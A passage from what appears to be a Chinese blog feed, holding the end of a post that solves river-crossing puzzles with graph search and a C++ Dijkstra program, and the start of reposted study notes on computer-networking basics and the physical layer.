class="number">1011</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">0010</span>)</span>--&gt;</span><span class="function"><span class="params">(<span class="number">1010</span>)</span>--&gt;</span>(<span class="number">0000</span>)（两条最短路之一）</span><br><span class="line">       左岸                                 右岸</span><br><span class="line"><span class="number">1</span>、人  狼  羊 花                           空</span><br><span class="line"><span class="number">2</span>、狼  花                                 人 羊</span><br><span class="line"><span class="number">3</span>、人  狼 花                               羊</span><br><span class="line"><span class="number">4</span>、花                                     人 狼  羊</span><br><span class="line"><span class="number">5</span>、人  羊  花                              狼</span><br><span class="line"><span class="number">6</span>、羊                                     人 花  狼</span><br><span class="line"><span class="number">7</span>、人 羊                                  狼 花</span><br><span class="line"><span class="number">8</span>、空                                     狼 花 人 羊   </span><br></pre></td></tr></table></figure><h2 id="传教士与吃人恶魔的问题"><a href="#传教士与吃人恶魔的问题" class="headerlink" title="传教士与吃人恶魔的问题"></a>传教士与吃人恶魔的问题</h2><p><strong>问题描述</strong></p><p>有三个传教士和三个吃人恶魔要渡过一条河，河中有一条船，只能装下两个人。在任何地方（无论是岸边还是船上），如果吃人恶魔数量多于传教士数量，吃人恶魔就会吃掉传教士。问：怎么才能让这些都安全过河？</p><p><strong>解题思路</strong></p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194640506-192088956.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194640506-192088956.png"></a></p><p>2、列举所有状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194800042-757542463.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194800042-757542463.png"></a></p><p>3、删除不合理状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028194856707-156878733.png"><img src="/2020/Graph-CrossRiver/1365470-20181028194856707-156878733.png"></a></p><p>4、连边（模拟依次渡河变化）</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028195050222-475204241.png"><img src="/2020/Graph-CrossRiver/1365470-20181028195050222-475204241.png"></a></p><p>5、寻找路径</p><p>寻找(33 L 00)–&gt;(00 R 33)的路径</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">其中一条路径</span><br><span class="line">(<span class="number">33</span> L <span class="number">00</span>)--&gt;(<span class="number">31</span> R <span class="number">01</span>)--&gt;(<span class="number">32</span> L <span class="number">01</span>)--&gt;(<span class="number">30</span> R <span class="number">03</span>)--&gt;(<span class="number">31</span> L <span class="number">02</span>)--&gt;(<span class="number">11</span> R <span class="number">22</span>)--&gt;(<span class="number">22</span> L <span class="number">01</span>)--&gt;(<span class="number">02</span> R <span class="number">31</span>)--&gt;(<span class="number">03</span> L <span class="number">30</span>)--&gt;(<span class="number">01</span> R <span class="number">32</span>)--&gt;(<span class="number">02</span> L <span class="number">31</span>)--&gt;(<span class="number">00</span> R <span class="number">33</span>)</span><br><span class="line"><span class="number">1</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">2</span>、一个吃人恶魔回来</span><br><span class="line"><span class="number">3</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">4</span>、一个吃人恶魔回来</span><br><span class="line"><span class="number">5</span>、两个传教士过河</span><br><span class="line"><span class="number">6</span>、一个传教士和一个吃人恶魔回来</span><br><span class="line"><span class="number">7</span>、两个传教士回来</span><br><span class="line"><span class="number">8</span>、一个吃人恶魔回去</span><br><span class="line"><span class="number">9</span>、两个吃人恶魔过河</span><br><span class="line"><span class="number">10</span>、一个吃人恶魔回去</span><br><span class="line"><span class="number">11</span>、两个吃人恶魔过河</span><br></pre></td></tr></table></figure><h2 id="四人过桥问题"><a href="#四人过桥问题" class="headerlink" title="四人过桥问题"></a>四人过桥问题</h2><p><strong>问题描述</strong></p><p>在一个漆黑的夜里，四位旅游者来到一座狭窄而没有护栏的桥边，如果不借助手电筒的话，大家是无论也不敢过去。不幸的是四个人中只有一只手电筒，而桥窄得只够两个人同时通过。如果各自单独过桥得话，四个人所需要的时间分别是1、2、5、10分钟，如果两个人同时过桥，所需要的时间是较慢的那个人单独行动时的时间。问：如何设计一个方案，让四个人尽快过桥。</p><p><strong>解题思路</strong></p><p>与前面两个相比，这次不仅要求方案，同时要求时间最短。 </p><p>同样需要定义状态，四个人+手电筒的位置</p><p>1、定义状态</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028230252029-80793767.png"><img src="/2020/Graph-CrossRiver/1365470-20181028230252029-80793767.png"></a></p><p>2、建图</p><p>分为每次通过一个人和每次两个人，都是带权无向边。</p><p>(下面只连接了与(01111)的边)</p><p><a href="https://img2018.cnblogs.com/blog/1365470/201810/1365470-20181028230534537-2018916150.png"><img src="/2020/Graph-CrossRiver/1365470-20181028230534537-2018916150.png"></a></p><p>3、寻找最短路</p><p>寻找(L 1111)–&gt;(R 0000)的最短路，即最短路算法中(01111)–&gt;(10000)的最短路，以下是利用Dijstra算法的解决方法。</p><p>最终答案为(2 + 1 + 10 + 2 + 2) = 17.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;queue&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义图中结点</span></span><br><span class="line">struct Node</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> u, d;            <span class="comment">//该节点的编号与距离</span></span><br><span class="line">    bool operator &lt; (<span class="keyword">const</span> Node x) <span class="keyword">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  d &gt; x.d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//边结构体的定义</span></span><br><span class="line">struct Edge</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> V = <span class="number">32</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> E = <span class="number">32</span> * <span class="number">32</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> dis[V];            <span class="comment">//源到各顶点的最短距离</span></span><br><span class="line"><span class="keyword">int</span> vis[V];            <span class="comment">//记录是否被收录，用来代替集合S</span></span><br><span class="line"><span class="keyword">int</span> head[V];          <span class="comment">//head[i]表示顶点i的第一条边的数组下标，&quot;-1&quot;表示顶点i没有边</span></span><br><span class="line">Edge edge[E];</span><br><span class="line"></span><br><span class="line"><span class="function">inline <span class="keyword">void</span> <span class="title">AddEdge</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> w, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edge[id].to = b;</span><br><span class="line">    edge[id].w = w;</span><br><span class="line">    edge[id].next = head[a];</span><br><span class="line">    head[a] = id;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//s为起点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijsktra</span><span class="params">(<span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    priority_queue&lt;Node&gt;q;            <span class="comment">//取出集合T中的最小值</span></span><br><span class="line">    memset(vis, <span class="number">0</span>, sizeof(vis));</span><br><span class="line">    memset(dis, INF, sizeof(dis));</span><br><span class="line"></span><br><span class="line">    dis[s] = <span class="number">0</span>;</span><br><span class="line">    q.push(Node&#123; s, dis[s] &#125;);</span><br><span class="line">    <span class="keyword">while</span> (!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        Node x = q.top(); q.pop();</span><br><span class="line">        <span class="keyword">int</span> u = x.u;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (vis[u])    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        vis[u] = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = head[u]; i != -<span class="number">1</span>; i = edge[i].next)    <span class="comment">//松弛与u直接相邻的顶点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> v = edge[i].to;</span><br><span class="line">            <span class="keyword">int</span> w = edge[i].w;</span><br><span class="line">            <span class="keyword">if</span> (!vis[v] &amp;&amp; dis[u] + w &lt; dis[v])</span><br><span class="line">            &#123;</span><br><span class="line">                dis[v] = dis[u] + w;</span><br><span class="line">                q.push(Node&#123; v,dis[v] &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> score[] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">10</span> &#125;;   <span class="comment">//每个人单独行动的时间</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//建图</span></span><br><span class="line">    memset(head, -<span class="number">1</span>, sizeof(head));</span><br><span class="line">    <span class="keyword">int</span> id = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">4</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> bits[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)  bits[j] = (i &gt;&gt; j) &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//一次走一个人</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)  <span class="keyword">if</span> (bits[j])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = i - (<span class="number">1</span> &lt;&lt; j) + <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">int</span> w = score[j];</span><br><span class="line">            AddEdge(i, tmp, w, id++);</span><br><span class="line">            AddEdge(tmp, i, w, id++);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//一次走两个人</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">3</span>;j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; k++)   <span class="keyword">if</span> (bits[j] &amp;&amp; bits[k])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = i - (<span class="number">1</span> &lt;&lt; j) - (<span class="number">1</span> &lt;&lt; k) + <span class="number">16</span>;</span><br><span class="line">                <span class="keyword">int</span> w = max(score[j],score[k]);</span><br><span class="line">                AddEdge(i, tmp, w, id++);</span><br><span class="line">                AddEdge(tmp, i, w, id++);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Dijsktra(<span class="number">15</span>);</span><br><span class="line">    printf(<span class="string">&quot;%d\n&quot;</span>, dis[<span class="number">16</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个农夫带着一头狼、一头羊、一颗白菜过河。他面前只有一条船，只能容纳他和一件物品，只有农夫会划船。如果农夫不在场，狼会吃羊、羊会吃白菜，农夫在场则不会。求将所有物品运到对岸的方案。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>计算机网络核心知识一网打尽</title>
    <link href="https://www.fvolcano.red/2020/null/"/>
    <id>https://www.fvolcano.red/2020/null/</id>
    <published>2020-11-06T00:02:49.000Z</published>
    <updated>2020-11-06T00:02:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>转自公众号：<a href="https://mp.weixin.qq.com/s/6ju4j_ffLuOBuoO53ZhcOA">JavaGuide:大二逃课总结1.2w字的计算机网络知识</a> 。供之后复习用。<a id="more"></a></p><h2 id="1-计算机网络概述"><a href="#1-计算机网络概述" class="headerlink" title="1. 计算机网络概述"></a>1. 计算机网络概述</h2><h3 id="1-1-基本术语"><a href="#1-1-基本术语" class="headerlink" title="1.1. 基本术语"></a>1.1. 基本术语</h3><ol><li><strong>结点 （node）</strong> ：网络中的结点可以是计算机，集线器，交换机或路由器等。</li><li><strong>链路（link ）</strong> : 从一个结点到另一个结点的一段物理线路。中间没有任何其他交点。</li><li><strong>主机（host）</strong> ：连接在因特网上的计算机。</li><li><strong>ISP（Internet Service Provider）</strong> ：因特网服务提供者（提供商）。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KyPrXgjoZp17VBfyxqcE8KTEyFqC9ZvMBlnT5nKpd29fmBvbyX0QFKA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="ISP (Internet Service Provider) Definition"></p><ol><li><strong>IXP（Internet eXchange Point）</strong> ：互联网交换点 IXP 的主要作用就是允许两个网络直接相连并交换分组，而不需要再通过第三个网络来转发分组。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Ko5p7DwqbmNKFGp6Tfib6HmshXw22mKoXMagJuKcRl7fqnVWRf6q5lGA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="IXP Traffic Levels During the Stratos Skydive — RIPE Labs"></p><p><a href="https://labs.ripe.net/Members/fergalc/ixp-traffic-during-stratos-skydive">https://labs.ripe.net/Members/fergalc/ixp-traffic-during-stratos-skydive</a></p><ol><li><strong>RFC(Request For Comments)</strong> ：意思是“请求评议”，包含了关于 Internet 几乎所有的重要的文字资料。</li><li><strong>广域网 WAN（Wide Area Network）</strong> ：任务是通过长距离运送主机发送的数据。</li><li><strong>城域网 MAN（Metropolitan Area Network）</strong>：用来将多个局域网进行互连。</li><li><strong>局域网 LAN（Local Area Network）</strong> ：学校或企业大多拥有多个互连的局域网。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KrcbeiaicrHWViab1Y1CpIL7HCRPkDU9krlC4LLNE7ZFd1OichDpTHpAWdg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="WMAN | Red de área metropolitana, Redes informaticas, Par trenzado">MAN &amp; </p><p><a href="http://conexionesmanwman.blogspot.com/">http://conexionesmanwman.blogspot.com/</a></p><ol><li><strong>个人区域网 PAN（Personal Area Network）</strong> ：在个人工作的地方把属于个人使用的电子设备用无线技术连接起来的网络 。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40K17hIicYcjUMEWOXggkLW94Jyj7iayq3yEXnQJ42JYD0sawosic7Olz8vA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="Advantages and disadvantages of personal area network (PAN) - IT Release"></p><p><a href="https://www.itrelease.com/2018/07/advantages-and-disadvantages-of-personal-area-network-pan/">https://www.itrelease.com/2018/07/advantages-and-disadvantages-of-personal-area-network-pan/</a></p><ol><li><strong>分组（packet ）</strong> ：因特网中传送的数据单元。由首部 header 和数据段组成。分组又称为包，首部可称为包头。</li><li><strong>存储转发（store and forward ）</strong> ：路由器收到一个分组，先检查分组是否正确，并过滤掉冲突包错误。确定包正确后，取出目的地址，通过查找表找到想要发送的输出端口地址，然后将该包发送出去。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KAGYPOOZYnccAPtoIe5wwSaTP9vlaJxgyLyISqBtjzkoLMWtB7miabrQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><ol><li><strong>带宽（bandwidth）</strong> ：在计算机网络中，表示在单位时间内从网络中的某一点到另一点所能通过的“最高数据率”。常用来表示网络的通信线路所能传送数据的能力。单位是“比特每秒”，记为 b/s。</li><li><strong>吞吐量（throughput ）</strong> ：表示在单位时间内通过某个网络（或信道、接口）的数据量。吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。吞吐量受网络的带宽或网络的额定速率的限制。</li></ol><h3 id="1-2-重要知识点总结"><a href="#1-2-重要知识点总结" class="headerlink" title="1.2. 重要知识点总结"></a>1.2. 重要知识点总结</h3><ol><li><strong>计算机网络（简称网络）把许多计算机连接在一起，而互联网把许多网络连接在一起，是网络的网络。</strong></li><li>小写字母 i 开头的 internet（互联网）是通用名词，它泛指由多个计算机网络相互连接而成的网络。在这些网络之间的通信协议（即通信规则）可以是任意的。大写字母 I 开头的 Internet（互联网）是专用名词，它指全球最大的，开放的，由众多网络相互连接而成的特定的互联网，并采用 TCP/IP 协议作为通信规则，其前身为 ARPANET。Internet 的推荐译名为因特网，现在一般流行称为互联网。</li><li>路由器是实现分组交换的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。分组交换采用存储转发技术，表示把一个报文（要发送的整块数据）分为几个分组后再进行传送。在发送报文之前，先把较长的报文划分成为一个个更小的等长数据段。在每个数据端的前面加上一些由必要的控制信息组成的首部后，就构成了一个分组。分组又称为包。分组是在互联网中传送的数据单元，正是由于分组的头部包含了诸如目的地址和源地址等重要控制信息，每一个分组才能在互联网中独立的选择传输路径，并正确地交付到分组传输的终点。</li><li>互联网按工作方式可划分为边缘部分和核心部分。主机在网络的边缘部分，其作用是进行信息处理。由大量网络和连接这些网络的路由器组成核心部分，其作用是提供连通性和交换。</li><li>计算机通信是计算机中进程（即运行着的程序）之间的通信。计算机网络采用的通信方式是客户-服务器方式（C/S 方式）和对等连接方式（P2P 方式）。</li><li>客户和服务器都是指通信中所涉及的应用进程。客户是服务请求方，服务器是服务提供方。</li><li>按照作用范围的不同，计算机网络分为广域网 WAN，城域网 MAN，局域网 LAN，个人区域网 PAN。</li><li><strong>计算机网络最常用的性能指标是：速率，带宽，吞吐量，时延（发送时延，处理时延，排队时延），时延带宽积，往返时间和信道利用率。</strong></li><li>网络协议即协议，是为进行网络中的数据交换而建立的规则。计算机网络的各层以及其协议集合，称为网络的体系结构。</li><li><strong>五层体系结构由应用层，运输层，网络层（网际层），数据链路层，物理层组成。运输层最主要的协议是 TCP 和 UDP 协议，网络层最重要的协议是 IP 协议。</strong></li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Kfsz72GZ1EcdaK10TEDmLicfWKA44icf6qaHtiaHfbPw2FQnaj8Ia9TMaw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>下面的内容会介绍计算机网络的五层体系结构：<strong>物理层+数据链路层+网络层（网际层）+运输层+应用层</strong>。</p><h2 id="2-物理层（Physical-Layer）"><a href="#2-物理层（Physical-Layer）" class="headerlink" title="2. 物理层（Physical Layer）"></a>2. 物理层（Physical Layer）</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KNaLqxZxFpZ39VMbFIhIco1KNmP32LgXonpxmyaCIiaicNqibF2pwqovRg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="物理层"></p><h3 id="2-1-基本术语"><a href="#2-1-基本术语" class="headerlink" title="2.1. 基本术语"></a>2.1. 基本术语</h3><ol><li><strong>数据（data）</strong> :运送消息的实体。</li><li><strong>信号（signal）</strong> ：数据的电气的或电磁的表现。或者说信号是适合在传输介质上传输的对象。</li><li><strong>码元（ code）</strong> ：在使用时间域（或简称为时域）的波形来表示数字信号时，代表不同离散数值的基本波形。</li><li><strong>单工（simplex ）</strong> : 只能有一个方向的通信而没有反方向的交互。</li><li><strong>半双工（half duplex ）</strong> ：通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</li><li><strong>全双工（full duplex）</strong> : 通信的双方可以同时发送和接收信息。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40Kic4S5U3DHOIqEJZPHpstnia2tKS0WEeLiaGJKfaJnbicicXDtvVoBianfAYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>失真</strong>：失去真实性，主要是指接受到的信号和发送的信号不同，有磨损和衰减。影响失真程度的因素：1.码元传输速率 2.信号传输距离 3.噪声干扰 4.传输媒体质量</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KohbQkoq2McFba8v1vVys8JHhycQvNqDBn9T2kksRcIwqibtwGlK41dQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><ol><li><strong>奈氏准则</strong> : 在任何信道中，码元的传输的效率是有上限的，传输速率超过此上限，就会出现严重的码间串扰问题，使接收端对码元的判决（即识别）成为不可能。</li><li><strong>香农定理</strong> ：在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</li><li><strong>基带信号（baseband signal）</strong> : 来自信源的信号。指没有经过调制的数字信号或模拟信号。</li><li><strong>带通（频带）信号（bandpass signal）</strong> ：把基带信号经过载波调制后，把信号的频率范围搬移到较高的频段以便在信道中传输（即仅在一段频率范围内能够通过信道），这里调制过后的信号就是带通信号。</li><li><strong>调制（modulation ）</strong> : 对信号源的信息进行处理后加到载波信号上，使其变为适合在信道传输的形式的过程。</li><li><strong>信噪比（signal-to-noise ratio ）</strong> : 指信号的平均功率和噪声的平均功率之比，记为 S/N。信噪比（dB）=10*log10（S/N）。</li><li><strong>信道复用（channel multiplexing ）</strong> ：指多个用户共享同一个信道。（并不一定是同时）。</li></ol><p><img src="https://mmbiz.qpic.cn/mmbiz_png/iaIdQfEric9Txpk4narOnyI7xL1Im2X40KbnVTuNkLQX0B1mYiamxa2pA4WL5mxiakq2oBsXYzXjac0kofNmg44L3A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="信道复用技术"></p><ol><li><strong>比特率（bit rate ）</strong> ：单位时间（每秒）内传送的比特数。</li><li><strong>波特率（baud rate）</strong> ：单位时间载波调制状态改变的次数。针对数据信号对载波的调制速率。</li><li><strong>复用（multiplexing）</strong> ：共享信道的方法。</li><li><strong>ADSL（Asymmetric Digital Subscriber Line ）</strong> ：非对称数字用户线。</li><li><strong>光纤同轴混合网（HFC 网）</strong> :在目前覆盖范围很广的有线电视网的基础上开发的一种居民宽带接入网</li></ol><h3 id="2-2-重要知识点总结"><a href="#2-2-重要知识点总结" class="headerlink" title="2.2. 重要知识点总结"></a>2.2. 重要知识点总结</h3><ol><li><strong>物理层的主要任务就是确定与传输媒体接口有关的一些特性，如机械特性，电气特性，功能特性，过程特性。</strong></li><li>一个数据通信系统可划分为三大部分，即源系统，传输系统，目的系统。源系统包括源点（或源站，信源）和发送器，目的系统包括接收器和终点。</li><li><strong>通信的目的是传送消息。如话音，文字，图像等都是消息，数据是运送消息的实体。信号则是数据的电器或电磁的表现。</strong></li><li>根据信号中代表消息的参数的取值方式不同，信号可分为模拟信号（或连续信号）和数字信号（或离散信号）。在使用时间域（简称时域）的波形表示数字信号时，代表不同离散数值的基本波形称为码元。</li><li>根据双方信息交互的方式，通信可划分为单向通信（或单工通信），双向交替通信（或半双工通信），双向同时通信（全双工通信）。</li><li>来自信源的信号称为基带信号。信号要在信道上传输就要经过调制。调制有基带调制和带通调制之分。最基本的带通调制方法有调幅，调频和调相。还有更复杂的调制方法，如正交振幅调制。</li><li>要提高数据在信道上的传递速率，可以使用更好的传输媒体，或使用先进的调制技术。但数据传输速率不可能任意被提高。</li><li>传输媒体可分为两大类，即导引型传输媒体（双绞线，同轴电缆，光纤）和非导引型传输媒体（无线，红外，大气激光）。</li><li>了有效利用光纤资源，在光纤干线和用户之间广泛使用无源光网络 PON。无源光网络无需配备电源，其长期运营成本和管理成本都很低。最流行的无源光网络是以太网无源光网络 EPON 和吉比特无源光网络 GPON。</li></ol><h3 id="2-3-补充"><a href="#2-3-补充" class="headerlink" title="2.3. 补充"></a>2.3. 补充</h3><h4 id="2-3-1-物理层主要做啥？"><a href="#2-3-1-物理层主要做啥？" class="headerlink" title="2.3.1. 物理层主要做啥？"></a>2.3.1. 物理层主要做啥？</h4><p>物理层主要做的事情就是 <strong>透明地传送比特流</strong>。也可以将物理层的主要任务描述为确定与传输媒体的接口的一些特性，即：机械特性（接口所用接线器的一些物理属性如形状尺寸），电气特性（接口电缆的各条线上出现的电压的范围），功能特性（某条线上出现的某一电平的电压的意义），过程特性（对于不同功能能的各种可能事件的出现顺序）。</p><p><strong>物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。</strong> 现有的计算机网络中的硬件设备和传输媒体的种类非常繁多，而且通信手段也有许多不同的方式。物理层的作用正是尽可能地屏蔽掉这些传输媒体和通信手段的差异，使物理层上面的数据链路层感觉不到这些差异，这样就可以使数据链路层只考虑完成本层的协议和服务，而不必考虑网络的具体传输媒体和通信手段是什么。</p><h4 id="2-3-2-几种常用的信道复用技术"><a href="#2-3-2-几种常用的信道复用技术" class="headerlink" title="2.3.2. 几种常用的信道复用技术"></a>2.3.2. 几种常用的信道复用技术</h4><ol><li><strong>频分复用(FDM)</strong> ：所有用户在同样的时间占用不同的带宽资源。</li><li><strong>时分复用（TDM）</strong> ：所有用户在不同的时间占用同样的频带宽度（分时不分频）。</li><li><strong>统计时分复用 (Statistic TDM)</strong> ：改进的时分复用，能够明显提高信道的利用率。</li><li><strong>码分复用(CDM)</strong> ：用户使用经过特殊挑选的不同码型，因此各用户之间不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li><li><strong>波分复用( WDM)</strong> ：波分复用就是光的频分复用。</li></ol><h4 id="2-3-3-几种常用的宽带接入技术，主要是-ADSL-和-FTTx"><a href="#2-3-3-几种常用的宽带接入技术，主要是-ADSL-和-FTTx" class="headerlink" title="2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 FTTx"></a>2.3.3. 几种常用的宽带接入技术，主要是 ADSL 和 